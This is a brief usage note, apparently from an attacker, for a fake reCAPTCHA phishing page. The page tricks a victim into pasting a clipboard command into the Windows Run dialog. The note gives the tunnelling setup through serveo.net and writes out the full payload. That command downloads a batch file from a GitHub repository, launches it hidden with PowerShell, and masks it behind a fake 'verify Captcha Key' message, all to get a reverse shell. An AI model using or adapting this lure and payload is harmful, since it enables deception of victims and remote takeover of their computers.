Externally Ex:
from /var/www/html
1- python -m http.server 9090
2- ssh -R 80:192.168.1.16:9090 serveo.net

now the victim will access https:/lablabla.serveo.net/reCaPTCHA/index.html
after that he will use Win+R then Ctrl+V  ... now i get revshell and he redirected to r.html then to google.com


----------------------------------------------------------------------------------------

in index.html --> the Clipboard func 

ex: cmd /c "curl https://raw.githubusercontent.com/0x2034/meterpreter/refs/heads/main/reCaPTCHA.bat -o %temp%\c.bat && powershell -c Start-Process '%temp%\c.bat' -WindowStyle Hidden && echo verify Captcha Key : 546as623dw66edd33ds5erst"
